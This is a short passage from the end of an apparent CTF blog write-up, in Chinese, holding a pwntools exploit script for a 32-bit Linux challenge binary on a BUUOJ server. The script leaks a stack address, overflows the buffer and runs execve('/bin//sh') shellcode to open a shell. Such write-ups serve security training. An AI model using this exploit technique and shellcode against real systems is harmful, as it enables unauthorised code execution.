因为我们后面还要用到那个回车所在地址的参数

```python
# -*- coding: UTF-8 -*-
import sys
from pwn import *
context(log_level=&#39;INFO&#39;, arch=&#39;i386&#39;, os=&#39;linux&#39;)
pwnfile = &#39;./2&#39;
if len(sys.argv) &lt; 2:
    io = process(pwnfile)
else:
    io = remote(&#39;node4.buuoj.cn&#39;, 28675)
elf = ELF(pwnfile)
rop = ROP(pwnfile)

padding = 0x14
mov_ecx_esp_addr = 0x08048087
#先调用write函数泄露栈的起始地址
shellcode = asm(&#39;xor ecx,ecx;xor edx,edx;push edx;push 0x68732f6e;push 0x69622f2f;mov ebx,esp;mov al,0xb;int 0x80&#39;)
# shellcode = b&#39;\x31\xc9\xf7\xe1\x51\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xb0\x0b\xcd\x80&#39;
payload = flat([b&#39;a&#39; * padding,mov_ecx_esp_addr])
io.recv()
io.send(payload)
stack = u32(io.recv(4))
print(&#34;stack_addr:&#34;&#43;hex(stack))
payload1=flat([b&#39;a&#39;*padding,(stack&#43;padding),shellcode])
#在栈上执行shellcode
io.send(payload1)
io.interactive()
```


---

> Author: [Lunatic](https://goodlunatic.github.io)  
> URL: https://goodlunatic.github.io/posts/d7eced5/  

